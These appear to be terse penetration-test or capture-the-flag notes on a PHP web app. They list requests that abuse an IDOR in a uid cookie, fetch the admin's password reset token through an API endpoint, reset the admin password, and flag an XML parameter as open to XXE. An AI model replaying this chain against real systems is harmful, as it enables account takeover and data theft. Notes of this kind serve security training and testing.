- GET /api.php/user/74
- POST /reset.php 
	- uid=74&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=test
- GET /profile.php 
	- Cookie: uid=74; PHPSESSID=03mc7db0phr649dt3s9mj88ivk



- UID seems to be IDOR in cookie
- Ran intruder on UID/API parameter
	- UID 52 is admin
- access denied when trying to use reset.php on admin account
- use GET /api.php/token/52 to get a password reset token
- use GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=test  to reset password
- reveals an add event option that transmits in XML
- name parameter is subject to XXE 